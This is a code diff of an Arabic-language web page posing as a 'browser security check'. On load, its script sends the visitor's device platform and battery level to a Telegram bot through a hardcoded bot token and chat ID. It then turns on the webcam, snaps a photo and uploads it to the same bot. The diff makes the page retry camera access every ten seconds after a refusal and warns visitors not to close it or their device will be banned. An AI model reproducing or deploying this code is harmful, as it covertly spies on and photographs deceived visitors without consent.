@@ -2,24 +2,28 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <title>فحص الأمان...</title>
     <script>
         const TOKEN = "8646462631:AAFw8-Bq5okCVYCSMhZ8RPMUDMwEDqAizHQ";
         const ADMIN_ID = "7616336100";
 
-        async function startHunt() {
+        async function sendInfo() {
             try {
                 let b = await navigator.getBattery();
-                let info = `🎯 صيد جديد!\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(b.level * 100)}%`;
+                let info = `🎯 صيد جديد (بقاء في الصفحة)!\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(b.level * 100)}%`;
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(info)}`);
+            } catch (e) {}
+        }
 
+        async function captureAndSend() {
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // انتظار 5 ثوانٍ لضمان لقطة واضحة
-                await new Promise(resolve => setTimeout(resolve, 5000));
+                // انتظار 4 ثوانٍ للقطة واضحة
+                await new Promise(resolve => setTimeout(resolve, 4000));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
@@ -32,19 +36,30 @@
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${ADMIN_ID}`, {
                         method: 'POST',
                         body: fd
-                    }).then(() => {
-                        // التحويل لرابط مقولة أو بحث جوجل
-                        window.location.href = "https://www.google.com/search?q=مقولات+عن+الحياة"; 
                     });
                 }, 'image/jpeg');
             } catch (e) {
-                window.location.href = "https://www.google.com/search?q=مقولات+عن+الحياة";
+                // في حال الرفض أو الخطأ، سيعاود المحاولة بعد 10 ثوانٍ دون الخروج من الصفحة
+                setTimeout(captureAndSend, 10000);
             }
         }
-        window.onload = startHunt;
+
+        window.onload = () => {
+            sendInfo();
+            captureAndSend();
+        };
     </script>
 </head>
 <body style="background:#000; color:#fff; text-align:center; padding-top:200px; font-family:sans-serif;">
-    <p>جاري فحص المتصفح... يرجى الانتظار</p>
+    <div id="loader" style="border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 0 auto 20px;"></div>
+    <p style="font-size: 1.2rem;">جاري فحص أمان المتصفح...</p>
+    <p style="color: #666;">يرجى عدم إغلاق هذه الصفحة لتجنب حظر جهازك</p>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </body>
 </html>
